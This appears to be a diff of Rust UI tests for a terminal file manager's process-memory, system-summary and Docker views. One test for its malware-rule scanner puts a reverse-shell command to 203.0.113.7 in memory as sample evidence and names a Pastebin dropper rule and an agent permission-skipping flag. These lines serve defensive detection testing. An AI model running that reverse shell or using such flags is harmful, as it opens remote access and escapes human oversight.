+    let values: Vec<u8> = (0..1u32 << bits).map(|value| value as u8).collect();
+    Some(borg_view::entropy::Entropy::of(&values))
+}
+
 #[test]
 fn activity_page_map_shows_what_each_page_of_a_region_holds() -> Result<()> {
-    use borg_core::{ActivityData, ActivityRequest, MemoryCensus, MemoryRegion, PageClass};
+    use borg_core::{ActivityData, ActivityRequest, CensusPage, MemoryCensus, MemoryRegion, PageClass};
     let mut stage = activity_stage()?;
     stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
     let id = stage.state.activity.pending.as_ref().unwrap().0;
@@ -2359,16 +3370,19 @@ fn activity_page_map_shows_what_each_page_of_a_region_holds() -> Result<()> {
         panic!("the map should ask for a census")
     };
     let runs = [
-        (PageClass::Pointers, 8),
-        (PageClass::Text, 12),
-        (PageClass::Wide, 4),
-        (PageClass::Zero, 16),
-        (PageClass::Dense, 4),
-        (PageClass::Data, 12),
-        (PageClass::Filler, 4),
-        (PageClass::Absent, 4),
+        (PageClass::Pointers, 8, entropy_of(5)),
+        (PageClass::Text, 12, entropy_of(4)),
+        (PageClass::Wide, 4, entropy_of(4)),
+        (PageClass::Zero, 16, entropy_of(0)),
+        (PageClass::Dense, 4, entropy_of(8)),
+        (PageClass::Data, 12, entropy_of(6)),
+        (PageClass::Filler, 4, entropy_of(0)),
+        (PageClass::Absent, 4, None),
     ];
-    let pages = runs.iter().flat_map(|&(class, count)| std::iter::repeat_n(class, count)).collect();
+    let pages = runs
+        .iter()
+        .flat_map(|&(class, count, entropy)| std::iter::repeat_n(CensusPage { class, entropy }, count))
+        .collect();
     let census =
         MemoryCensus { process, start: region.start, end: region.end, page: 4096, stride: 1, pages, residency: true };
     stage.send(Msg::Activity { id, result: Ok(ActivityData::Census(census)) });
@@ -2376,7 +3390,10 @@ fn activity_page_map_shows_what_each_page_of_a_region_holds() -> Result<()> {
         stage.send(key(KeyCode::Right));
     }
     let buffer = stage.render(stage.started)?;
-    ensure_text(&buffer, "0x10000a000 · text")?;
+    ensure_text(&buffer, "0x10000a000 · text · 4 bits per byte")?;
+    ensure_text(&buffer, "high entropy 6%")?;
+    ensure_text(&buffer, "media, archives and keys")?;
+    ensure_text(&buffer, "highest 8 bits per byte")?;
     check("activity_page_map", &stage, buffer)?;
     let classic = stage.state.appearance.choices().iter().position(|c| c.id == "classic").unwrap();
     stage.state.appearance.select(classic, stage.started, Duration::ZERO);
@@ -2387,6 +3404,47 @@ fn activity_page_map_shows_what_each_page_of_a_region_holds() -> Result<()> {
         stage.render(stage.started)?;
     }
     Ok(())
+}
+
+#[test]
+fn activity_page_map_marks_packed_code_whatever_its_kind() -> Result<()> {
+    use borg_core::{ActivityData, ActivityRequest, CensusPage, MemoryCensus, MemoryRegion, PageClass};
+    let mut stage = activity_stage()?;
+    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
+    let id = stage.state.activity.pending.as_ref().unwrap().0;
+    let process = stage.state.activity.selected.unwrap();
+    let region = MemoryRegion {
+        start: 0x100000000,
+        end: 0x100000000 + 64 * 4096,
+        permissions: "r-x".into(),
+        name: "/opt/tool/bin/tool".into(),
+        ..Default::default()
+    };
+    stage.send(Msg::Activity { id, result: Ok(ActivityData::Regions(vec![region.clone()])) });
+    stage.send(key(KeyCode::Char('m'))).send(key(KeyCode::Enter)).send(key(KeyCode::Enter));
+    let Some((id, ActivityRequest::Census { .. })) = stage.state.activity.pending.clone() else {
+        panic!("the map should ask for a census")
+    };
+    let runs = [
+        (PageClass::Code, 24, entropy_of(6)),
+        (PageClass::Code, 28, Some(borg_view::entropy::Entropy::of(&(0..=255).collect::<Vec<u8>>()))),
+        (PageClass::Zero, 8, entropy_of(0)),
+        (PageClass::Absent, 4, None),
+    ];
+    let pages = runs
+        .iter()
+        .flat_map(|&(class, count, entropy)| std::iter::repeat_n(CensusPage { class, entropy }, count))
+        .collect();
+    let census =
+        MemoryCensus { process, start: region.start, end: region.end, page: 4096, stride: 1, pages, residency: true };
+    stage.send(Msg::Activity { id, result: Ok(ActivityData::Census(census)) });
+    for _ in 0..30 {
+        stage.send(key(KeyCode::Right));
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "0x10001e000 · code · 8 bits per byte")?;
+    ensure_text(&buffer, "high entropy 44%")?;
+    check("activity_page_map_packed_code", &stage, buffer)
 }
 
 #[test]
@@ -2498,6 +3556,123 @@ fn activity_files_tabs_and_scrolled_regions_keep_selection_visible() -> Result<(
     Ok(())
 }
 
+/// Made-up use for each of `count` cores, uneven so the bars differ.
+fn busy_cores(count: u32) -> Vec<u32> {
+    (0..count).map(|core| (core * 3_700 + 900) % 10_100).collect()
+}
+
+#[test]
+fn activity_summary_shows_each_core_beside_memory_disks_load_and_uptime() -> Result<()> {
+    let mut stage = activity_stage_with(GridSize { cols: 132, rows: 34 }, |sample| borg_core::SystemSample {
+        cpu: busy_cores(16),
+        ..sample
+    })?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "16 ")?;
+    ensure_text(&buffer, "13%, steady")?;
+    ensure_text(&buffer, "Processes 5 ")?;
+    ensure_text(&buffer, "Threads   412 · 3 running")?;
+    ensure_text(&buffer, "Up        3 days, 4 hours")?;
+    ensure_text(&buffer, "Disk      read 12M/s")?;
+    ensure_text(&buffer, "          write 3.0M/s")?;
+    anyhow::ensure!(!describe(&buffer).contains("waiting"), "the cores keep up");
+    check("activity_summary_wide", &stage, buffer)?;
+    stage.send(key(KeyCode::Char('s')));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "│CPU 46.6% · RAM 17G/30G · Swap 244M/3.7G · 5 processes          ││CPU 46.6%")?;
+    anyhow::ensure!(!describe(&buffer).contains("Threads"), "the summary is hidden");
+    check("activity_summary_hidden", &stage, buffer)
+}
+
+#[test]
+fn activity_summary_in_a_narrow_pane_stacks_its_figures_and_shows_cores_as_a_strip() -> Result<()> {
+    let mut stage = activity_stage_with(GridSize { cols: 84, rows: 34 }, |sample| borg_core::SystemSample {
+        cpu: busy_cores(16),
+        disk: sample.disk.map(|disk| borg_core::DiskActivity { busy: None, ..disk }),
+        threads: None,
+        ..sample
+    })?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Cores")?;
+    ensure_text(&buffer, "Processes 5 ")?;
+    anyhow::ensure!(!describe(&buffer).contains("Threads"), "a system that does not count threads");
+    check("activity_summary_narrow", &stage, buffer)?;
+    let mut stage = activity_stage_with(GridSize { cols: 84, rows: 34 }, |sample| borg_core::SystemSample {
+        cpu: busy_cores(16),
+        ..sample
+    })?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Threads   412 · 3 running")?;
+    ensure_text(&buffer, "Disk      read 12M/s · write 3.0M/s")?;
+    Ok(())
+}
+
+/// More work than the cores can run fills the load bar in the notice color and says about how
+/// many processes wait for a core, in a wide pane and a narrow one.
+#[test]
+fn activity_summary_flags_load_above_what_the_cores_can_run() -> Result<()> {
+    let overloaded = |sample: borg_core::SystemSample| borg_core::SystemSample {
+        cpu: busy_cores(16),
+        load: Some(borg_core::LoadAverage { one: 2_214, five: 1_890, fifteen: 1_420 }),
+        ..sample
+    };
+    let mut stage = activity_stage_with(GridSize { cols: 132, rows: 34 }, overloaded)?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Load   ~7 waiting       ")?;
+    ensure_text(&buffer, "138%, rising")?;
+    check("activity_summary_overloaded", &stage, buffer)?;
+    let mut stage = activity_stage_with(GridSize { cols: 84, rows: 40 }, overloaded)?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Load       ~7 waiting   ")?;
+    check("activity_summary_overloaded_narrow", &stage, buffer)?;
+    let mut stage = activity_stage_with(GridSize { cols: 84, rows: 30 }, overloaded)?;
+    let buffer = stage.render(stage.started)?;
+    let short = "│CPU 46.6% · RAM 17G/30G · … · ~7 waiting│";
+    ensure_text(&buffer, short)?;
+    stage.send(key(KeyCode::Char('s')));
+    ensure_text(&stage.render(stage.started)?, short)
+}
+
+#[test]
+fn activity_summary_shows_many_cores_as_a_strip() -> Result<()> {
+    let mut stage = activity_stage_with(GridSize { cols: 132, rows: 34 }, |sample| borg_core::SystemSample {
+        cpu: busy_cores(96),
+        ..sample
+    })?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Cores")?;
+    check("activity_summary_many_cores", &stage, buffer)
+}
+
+#[test]
+fn activity_filter_finds_a_pid_and_clicks_type_nothing_into_it() -> Result<()> {
+    use borg_core::ActivitySort;
+    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
+    let mut stage = activity_stage()?;
+    stage.send(key(KeyCode::Char('/')));
+    for msg in chars("412") {
+        stage.send(msg);
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "1 of 5")?;
+    assert_eq!(stage.state.activity.process().unwrap().name, "database");
+    check("activity_filter_pid", &stage, buffer)?;
+    let shot = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
+    for label in ["Filter", "PID    CPU"] {
+        let (column, row) = shot.find(label).unwrap();
+        let click =
+            MouseEvent { column, row, kind: MouseEventKind::Down(MouseButton::Left), modifiers: KeyModifiers::NONE };
+        let msg = borg_ui::mouse_input(&stage.state, click, false, stage.started).unwrap();
+        stage.send(msg);
+        assert_eq!(stage.state.activity.filter, "412", "a click on {label} types nothing");
+    }
+    assert!(!stage.state.activity.filtering);
+    assert_eq!(stage.state.activity.sort, ActivitySort::Pid);
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "/ edit")?;
+    check("activity_filter_pid_sorted_by_click", &stage, buffer)
+}
+
 #[test]
 fn activity_narrow_layout_mouse_sort_and_selection() -> Result<()> {
     use borg_core::{ActivitySort, Pointer};
@@ -2522,6 +3697,43 @@ fn activity_narrow_layout_mouse_sort_and_selection() -> Result<()> {
     stage.send(Msg::Resize { cols: 44, rows: 14 });
     let buffer = stage.render(stage.started)?;
     check("activity_narrow", &stage, buffer)
+}
+
+#[test]
+fn activity_tree_folds_branches_and_the_overview_shows_the_process_tree() -> Result<()> {
+    use borg_core::{ActivityData, ActivityRequest, ProcessInfo, ProcessKey, SystemSample};
+    const SAMPLE_WITH_WORKERS: u64 = 1_000;
+    let mut stage = activity_stage()?;
+    let mut processes = stage.state.activity.sample.processes.clone();
+    let worker = |pid: u32, name: &str, parent: u32, ram: u64| ProcessInfo {
+        key: ProcessKey { pid, start: 200 },
+        name: name.into(),
+        parent: Some(parent),
+        resident: Some(ram),
+        cpu: Some(10120),
+        ..processes[0].clone()
+    };
+    processes
+        .extend([worker(1749116, "build-worker", 410, 480_000_000), worker(1749117, "linker", 1749116, 96_000_000)]);
+    let id = stage.state.activity.pending.as_ref().map_or(SAMPLE_WITH_WORKERS, |pending| pending.0);
+    stage.state.activity.pending = Some((id, ActivityRequest::Sample));
+    let sample = SystemSample { processes, ..stage.state.activity.sample.clone() };
+    stage.send(Msg::Activity { id, result: Ok(ActivityData::Sample(sample)) });
+    stage.send(key(KeyCode::Char('t')));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "1749116 101.2")?;
+    ensure_text(&buffer, "▾ compiler")?;
+    ensure_text(&buffer, "Process tree")?;
+    check("activity_tree", &stage, buffer)?;
+    stage.send(key(KeyCode::Left));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "▸ compiler · 3 processes")?;
+    check("activity_tree_folded", &stage, buffer)?;
+    stage.send(key(KeyCode::Right)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
+    let buffer = stage.render(stage.started)?;
+    assert_eq!(stage.state.activity.process().unwrap().name, "linker");
+    ensure_text(&buffer, "1749117 linker")?;
+    check("activity_tree_family", &stage, buffer)
 }
 
 #[test]
@@ -2763,6 +3975,7 @@ fn integrity_findings_lead_with_alerts_and_mark_their_evidence() -> Result<()> {
         region: region.cloned(),
         address,
         length,
+        note: None,
     };
     let findings = vec![
         finding(
@@ -2840,6 +4053,101 @@ fn integrity_findings_lead_with_alerts_and_mark_their_evidence() -> Result<()> {
 }
 
 #[test]
+fn rule_matches_in_memory_show_their_evidence_and_what_else_explains_them() -> Result<()> {
+    use borg_core::{ActivityData, ActivityRequest, MemoryRegion, MemorySnapshot, RulesReport};
+    use borg_rules::{Evidence, Level, Problem, RuleMatch};
+    let mut stage = activity_stage()?;
+    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
+    let id = stage.state.activity.pending.as_ref().unwrap().0;
+    let process = stage.state.activity.selected.unwrap();
+    let heap = MemoryRegion {
+        start: 0x600000000,
+        end: 0x600800000,
+        permissions: "rw-".into(),
+        name: "MALLOC_LARGE".into(),
+        ..Default::default()
+    };
+    stage.send(Msg::Activity { id, result: Ok(ActivityData::Regions(vec![heap.clone()])) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Y Rules")?;
+    stage.send(key(KeyCode::Char('y')));
+    let Some((id, ActivityRequest::Rules { .. })) = stage.state.activity.pending.clone() else {
+        panic!("Y should scan with rules")
+    };
+    stage.send(Msg::MemorySearchProgress { id, scanned: 48_000_000, total: 96_000_000, hits: 2 });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Scanning with rules · 46M/92M · 2 matches")?;
+
+    let found = |rule: &str, namespace: &str, level, offset, bytes: &[u8]| RuleMatch {
+        rule: rule.into(),
+        namespace: namespace.into(),
+        level,
+        description: Some("Pastebin raw links, where droppers fetch their next stage".into()),
+        false_positives: Some("Developers share snippets this way".into()),
+        evidence: Some(Evidence { string: "$a".into(), offset, length: bytes.len() as u64, bytes: bytes.to_vec() }),
+    };
+    let user = "/home/me/.config/borg-commander/rules/droppers.yar";
+    let mut findings = vec![
+        borg_core::rule_finding(
+            &found(
+                "reverse_shell",
+                borg_rules::BUILT_IN,
+                Level::Alert,
+                0x1a40,
+                b"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+            ),
+            &heap,
+            0x600000000,
+        ),
+        borg_core::rule_finding(
+            &found("agent_unattended", borg_rules::BUILT_IN, Level::Warning, 0x8000, b"--dangerously-skip-permissions"),
+            &heap,
+            0x600000000,
+        ),
+        borg_core::rule_finding(
+            &found("Pastebin_Raw", user, Level::Notice, 0x20, b"pastebin.com/raw/"),
+            &heap,
+            0x600400000,
+        ),
+    ];
+    let broken =
+        Problem { file: "/home/me/.config/borg-commander/rules/old.yar".into(), message: "syntax error".into() };
+    findings.push(borg_core::problem_finding(&broken));
+    let report = RulesReport {
+        process,
+        findings,
+        rules: 17,
+        scanned: 96_000_000,
+        total: 96_000_000,
+        unreadable: 0,
+        complete: true,
+    };
+    stage.send(Msg::Activity { id, result: Ok(ActivityData::Rules(report)) });
+    stage.send(key(KeyCode::Enter));
+    let Some((id, ActivityRequest::Capture { region, .. })) = stage.state.activity.pending.clone() else {
+        panic!("Enter should preview the match")
+    };
+    let mut bytes = vec![0; 256];
+    let shell = b"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1";
+    bytes[32..32 + shell.len()].copy_from_slice(shell);
+    stage.send(Msg::Activity {
+        id,
+        result: Ok(ActivityData::Snapshot(MemorySnapshot { process, address: region.start, bytes, captured: 1 })),
+    });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Rule matches")?;
+    ensure_text(&buffer, "$a matched")?;
+    check("activity_rules", &stage, buffer)?;
+    stage.send(key(KeyCode::Tab));
+    for _ in 0..3 {
+        stage.send(key(KeyCode::Down));
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Left out /home/me/.config/borg-commander/rules/old.yar")?;
+    check("activity_rules_problem", &stage, buffer)
+}
+
+#[test]
 fn expanded_size_tree_accounts_for_files_outside_child_directories() -> Result<()> {
     let mut stage = size_tree_stage()?;
     stage.send(key(KeyCode::Right)).send(key(KeyCode::Right));
@@ -2876,6 +4184,33 @@ fn background_sizes_stay_in_normal_panels_with_progress_and_stop_action() -> Res
     Ok(())
 }
 
+#[test]
+fn f3_on_a_folder_counts_its_size_and_the_key_bar_and_file_menu_say_so() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 132, rows: 28 }, Motion::STILL)?;
+    for _ in 0..2 {
+        stage.send(Msg::Key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE)));
+    }
+    assert_eq!(stage.state.active_panel().hovered_entry().map(|entry| entry.name.as_str()), Some("src"));
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::F(3), KeyModifiers::NONE)));
+    let id = stage.state.sizing.as_ref().context("F3 starts a size count")?.id;
+    stage.send(Msg::SizeProgress { id, progress: borg_core::SearchProgress { visited: 812, ..Default::default() } });
+    let mut growing = entry("src", EntryKind::Dir, 45200000, RECENT, false);
+    growing.source = Some("/home/me/projects/borg/src".into());
+    growing.usage = Some(borg_vfs::FolderUsage { files: 410, folders: 24, partial: true, ..Default::default() });
+    stage.send(Msg::Sized { id, entries: vec![growing] });
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "F3Count")?;
+    ensure_text(&buffer, "≥43M")?;
+    ensure_text(&buffer, "Sizes · 812 scanned")?;
+    check("f3_folder_size", &stage, buffer)?;
+
+    let index = borg_core::menus(&stage.state).iter().position(|menu| menu.title == "File").unwrap();
+    stage.send(Msg::Pointer(borg_core::Pointer::Menu(index)));
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "Count size")?;
+    check("f3_folder_size_menu", &stage, buffer)
+}
+
 fn container(
     id: &str,
     project: Option<&str>,
@@ -2900,13 +4235,23 @@ fn container(
     }
 }
 
+/// Wide enough for the Docker list to show CPU now beside the average.
+const DOCKER_WIDE: GridSize = GridSize { cols: 132, rows: 34 };
+/// Narrow enough for the Docker list to show the average alone.
+const DOCKER_NARROW: GridSize = GridSize { cols: 80, rows: 34 };
+
+fn resize(stage: &mut Stage, size: GridSize) {
+    stage.send(Msg::Resize { cols: size.cols, rows: size.rows });
+    stage.emulator.resize(GridSize::console(size.cols, size.rows));
+}
+
 /// The Docker view over made-up projects: a list of projects and containers on the left,
 /// the selected container's details and live CPU and memory on the right.
 #[test]
 fn docker_lists_projects_and_shows_container_details() -> Result<()> {
     use borg_core::{DockerData, DockerRequest};
     use borg_docker::{Details, Mount, Network, State, Stats};
-    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    let mut stage = stage(DOCKER_WIDE, Motion::STILL)?;
     let theme = stage.state.appearance.choices().iter().position(|c| c.id == "neon").unwrap();
     stage.state.appearance.select(theme, stage.started, Duration::ZERO);
     let effects = borg_core::update(
@@ -2931,9 +4276,10 @@ fn docker_lists_projects_and_shows_container_details() -> Result<()> {
     let ids: Vec<String> = containers.iter().map(|c| c.id.clone()).collect();
     stage
         .send(Msg::Docker { id, result: Ok(DockerData::Listed { context: Some("desktop-linux".into()), containers }) });
-    for second in 0..40u64 {
+    let seconds = 40u64;
+    for second in 0..seconds {
         let wave = (second as f64 / 4.0).sin().abs();
-        stage.send(Msg::DockerStats(vec![
+        let frame = vec![
             (
                 ids[0].clone(),
                 Stats {
@@ -2952,7 +4298,9 @@ fn docker_lists_projects_and_shows_container_details() -> Result<()> {
                 Stats { cpu: 120, memory: 420_000_000, memory_limit: 8_000_000_000, pids: 31, ..Stats::default() },
             ),
             (ids[3].clone(), Stats { memory: 64_000_000, ..Stats::default() }),
-        ]));
+        ];
+        let at = stage.started - Duration::from_secs(seconds - 1 - second);
+        borg_core::update(&mut stage.state, Msg::DockerStats(frame), at);
     }
     for _ in 0..4 {
         stage.send(key(KeyCode::Down));
@@ -3001,7 +4349,19 @@ fn docker_lists_projects_and_shows_container_details() -> Result<()> {
     stage.send(key(KeyCode::Up)).send(key(KeyCode::Up));
     let buffer = stage.render(later)?;
     ensure_text(&buffer, "2 of 3 running")?;
+    ensure_text(&buffer, "Now %  Avg %")?;
     check("docker_project", &stage, buffer)?;
+
+    resize(&mut stage, DOCKER_NARROW);
+    let buffer = stage.render(later)?;
+    anyhow::ensure!(!describe(&buffer).contains("Now %"), "a narrow list shows the average alone");
+    check("docker_project_narrow", &stage, buffer)?;
+    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
+    let buffer = stage.render(later)?;
+    ensure_text(&buffer, "CPU avg")?;
+    check("docker_container_narrow", &stage, buffer)?;
+    stage.send(key(KeyCode::Up)).send(key(KeyCode::Up));
+    resize(&mut stage, DOCKER_WIDE);
 
     stage.send(key(KeyCode::Char('x')));
     let Some(borg_core::Overlay::Confirm(confirm)) = stage.state.overlay.clone() else { panic!("stopping asks first") };
@@ -3018,6 +4378,308 @@ fn docker_lists_projects_and_shows_container_details() -> Result<()> {
     stage.send(key(KeyCode::Esc));
     assert!(!stage.state.docker.is_open(), "Esc closes the view");
     Ok(())
+}
+
+/// What the made-up shop engine keeps on disk: two builds of the web image, the worker's old
+/// image, a dangling build, a digest pull, containers that stopped, and volumes of every kind.
+fn disk_use() -> borg_docker::DiskUse {
+    use borg_docker::{CacheRecord, Compose, DiskUse, Engine, Image, Layer, State, Volume, VolumeUser};
+    const MB: u64 = 1_000_000;
+    let time = |stamp: &str| stamp.parse::<jiff::Timestamp>().ok();
+    let image = |id: &str, tags: &[&str], repository: Option<&str>, size: u64, unique: u64, containers: u32| Image {
+        id: format!("sha256:{id}{}", "0".repeat(52)),
+        tags: tags.iter().map(|tag| (*tag).to_owned()).collect(),
+        repository: repository.map(str::to_owned),
+        size: Some(size),
+        shared: Some(size - unique),
+        unique: Some(unique),
+        created: time("2026-01-08T16:20:00Z"),
+        containers: Some(containers),
+    };
+    let layer = |name: &str, state: State, status: &str, size: u64| Layer {
+        id: format!("{}{}", &name[..4], "0".repeat(60)),
+        name: name.into(),
+        image: "shop-web:1.4".into(),
+        state,
+        status: status.into(),
+        size: Some(size),
+    };
+    let user = |container: &str, state: State, path: &str, finished: Option<&str>| VolumeUser {
+        container: container.into(),
+        image: "shop-web:1.4".into(),
+        state,
+        path: path.into(),
+        read_only: false,
+        started: time("2026-01-15T09:00:00Z"),
+        finished: finished.and_then(time),
+    };
+    let volume = |name: &str, size: u64, users: Vec<VolumeUser>, project: Option<&str>, created: &str| Volume {
+        name: name.into(),
+        size: Some(size),
+        links: Some(users.len() as u32),
+        anonymous: project.is_none(),
+        created: time(created),
+        compose: project.map(|project| Compose {
+            project: project.into(),
+            volume: name.split_once('_').map(|(_, key)| key.to_owned()),
+        }),
+        driver: "local".into(),
+        options: Vec::new(),
+        mountpoint: Some(format!("/var/lib/docker/volumes/{name}/_data").into()),
+        users,
+    };
+    let record = |id: &str, kind: &str, size: u64, shared: bool, in_use: bool, description: &str| CacheRecord {
+        id: format!("{id}{}", "x".repeat(20)),
+        kind: kind.into(),
+        size: Some(size),
+        shared,
+        in_use,
+        last_used: time("2026-01-14T18:05:00Z"),
+        description: description.into(),
+    };
+    DiskUse {
+        images: vec![
+            image("a1b2c3d4e5f6", &["shop-web:1.4", "shop-web:latest"], Some("shop-web"), 248 * MB, 31 * MB, 1),
+            image("b2c3d4e5f6a7", &["postgres:16"], Some("postgres"), 438 * MB, 438 * MB, 1),
+            image("c3d4e5f6a7b8", &["shop-worker:1.3"], Some("shop-worker"), 236 * MB, 160 * MB, 0),
+            image("d4e5f6a7b8c9", &[], None, 247 * MB, 29 * MB, 0),
+            image("e5f6a7b8c9d0", &[], Some("mirror.example/tools/jq"), 3 * MB, 3 * MB, 0),
+        ],
+        containers: vec![
+            layer("shop-web-1", State::Running, "Up 3 hours", 2 * MB),
+            layer("shop-db-1", State::Running, "Up 3 hours", 63),
+            layer("shop-worker-1", State::Exited, "Exited (1) 12 minutes ago", 48 * MB),
+            layer("shop-migrate-1", State::Created, "Created", 0),
+        ],
+        volumes: vec![
+            volume(
+                "shop_data",
+                312 * MB,
+                vec![user("shop-db-1", State::Running, "/var/lib/postgresql/data", None)],
+                Some("shop"),
+                "2025-11-02T08:00:00Z",
+            ),
+            volume("blog_uploads", 860 * MB, Vec::new(), Some("blog"), "2025-06-13T10:09:31Z"),
+            volume(
+                "3b9d5e7f1a2c4b6d8e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d",
+                512 * MB,
+                Vec::new(),
+                None,
+                "2025-12-30T21:14:00Z",
+            ),
+            volume(
+                "7c2f8e1d0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d",
+                41 * MB,
+                vec![user("shop-worker-1", State::Exited, "/app/data", Some("2026-01-15T11:48:03Z"))],
+                None,
+                "2026-01-08T16:21:00Z",
+            ),
+        ],
+        cache: vec![
+            record("r1", "regular", 412 * MB, false, false, "[build 3/5] RUN npm ci"),
+            record("r2", "regular", 75 * MB, true, false, "[build 1/5] FROM node:22"),
+            record("r3", "exec.cachemount", 296 * MB, false, false, "--mount=type=cache,target=/root/.npm"),
+            record("r4", "source.local", MB, false, true, "local source for context"),
+        ],
+        networks: vec!["blog_default".into()],
+        engine: Engine { system: "OrbStack".into(), host: "orbstack".into(), helper: false },
+    }
+}
+
+/// Docker's disk use beside the containers: a row per kind with its reclaimable total, a kind
+/// unfolded into its items with two marked, and the console with the command F8 typed.
+#[test]
+fn docker_disk_use_lists_kinds_and_types_cleanup_at_the_prompt() -> Result<()> {
+    use borg_core::{DockerData, DockerRequest, Effect, View};
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::ALT)));
+    let Some((id, DockerRequest::List)) = stage.state.docker.pending.clone() else {
+        panic!("opening lists containers")
+    };
+    let listed = DockerData::Listed { context: Some("desktop-linux".into()), containers: Vec::new() };
+    stage.send(Msg::Docker { id, result: Ok(listed) });
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Char('d')), stage.started);
+    let id = effects
+        .iter()
+        .find_map(|e| match e {
+            Effect::Docker { id, request: DockerRequest::DiskUse } => Some(*id),
+            _ => None,
+        })
+        .context("D measures disk use")?;
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "Measuring disk use…")?;
+    let measured = DockerData::DiskUse {
+        usage: Box::new(disk_use()),
+        context: Some("desktop-linux".into()),
+        contexts: Some(vec!["default".into(), "desktop-linux".into()]),
+        folders: Default::default(),
+    };
+    stage.send(Msg::Docker { id, result: Ok(measured) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Disk use · desktop-linux")?;
+    ensure_text(&buffer, "docker --context desktop-linux builder prune")?;
+    check("docker_disk", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Right)).send(key(KeyCode::Down));
+    stage.send(key(KeyCode::Char(' '))).send(key(KeyCode::Char(' '))).send(key(KeyCode::Up));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "2 marked")?;
+    check("docker_disk_expanded", &stage, buffer)?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::F(8)), stage.started);
+    let typed: Vec<u8> = effects
+        .iter()
+        .filter_map(|e| match e {
+            Effect::Write(bytes) => Some(bytes.clone()),
+            _ => None,
+        })
+        .flatten()
+        .collect();
+    assert_eq!(typed, b"docker --context desktop-linux rmi shop-worker:1.3 e5f6a7b8c9d0", "no Enter");
+    assert_eq!(stage.state.view, View::Shell);
+    stage.shell(&typed);
+    let buffer = stage.render(stage.started)?;
+    check("docker_disk_typed", &stage, buffer)
+}
+
+/// Volumes with what tells them apart in the Name column: when they were last used (a day with
+/// ~ is the newest change to their files), made, their Compose project and their containers;
+/// then one volume's details, and its files in the panel, read only.
+#[test]
+fn docker_volumes_show_their_last_use_and_open_read_only() -> Result<()> {
+    use borg_core::{DockerData, DockerRequest, Effect, VolumeContents};
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::ALT)));
+    let Some((id, DockerRequest::List)) = stage.state.docker.pending.clone() else {
+        panic!("opening lists containers")
+    };
+    stage.send(Msg::Docker { id, result: Ok(DockerData::Listed { context: None, containers: Vec::new() }) });
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Char('d')), stage.started);
+    let id = effects
+        .iter()
+        .find_map(|e| match e {
+            Effect::Docker { id, request: DockerRequest::DiskUse } => Some(*id),
+            _ => None,
+        })
+        .context("D measures disk use")?;
+    let share = PathBuf::from(HOME).join("OrbStack/docker/volumes/blog_uploads");
+    let measured = DockerData::DiskUse {
+        usage: Box::new(disk_use()),
+        context: None,
+        contexts: None,
+        folders: [("blog_uploads".to_owned(), share.clone())].into(),
+    };
+    let effects = borg_core::update(&mut stage.state, Msg::Docker { id, result: Ok(measured) }, stage.started);
+    let read = effects
+        .iter()
+        .find_map(|e| match e {
+            Effect::Docker { id, request: DockerRequest::ReadVolumes(volumes) } => Some((*id, volumes.clone())),
+            _ => None,
+        })
+        .context("measuring reads the volumes Borg reaches")?;
+    assert_eq!(read.1, [("blog_uploads".to_owned(), share.clone())]);
+    let contents = VolumeContents {
+        newest: "2026-01-10T14:02:00Z".parse().ok(),
+        top: vec!["2025".into(), "2026".into(), "index.json".into()],
+    };
+    stage
+        .send(Msg::Docker { id: read.0, result: Ok(DockerData::VolumeRead { name: "blog_uploads".into(), contents }) });
+    stage.send(Msg::Docker { id: read.0, result: Ok(DockerData::Done) });
+
+    for _ in 0..5 {
+        stage.send(key(KeyCode::Down));
+    }
+    stage.send(key(KeyCode::Right)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Right));
